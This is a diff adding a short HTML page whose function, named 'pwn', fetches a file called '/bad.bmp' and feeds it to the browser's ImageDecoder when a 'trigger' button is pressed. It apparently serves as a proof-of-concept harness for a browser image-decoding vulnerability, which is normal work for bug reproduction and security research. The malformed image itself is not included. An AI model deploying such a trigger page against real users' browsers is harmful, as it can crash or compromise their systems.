@@ -1,0 +1,17 @@
+<html>
+  <head>
+    <script>
+    function pwn() {
+      function decodeImage(imageByteStream) {
+        let imageDecoder = new ImageDecoder({data: imageByteStream, type: "image/bmp"});
+        imageDecoder.decode();
+      }
+      fetch("/bad.bmp").then(response => decodeImage(response.body))
+    }
+  </script>
+  </head>
+  <body onload="">
+    <button type="submit" onclick="pwn()">trigger</button>
+  </body>
+</html>
+
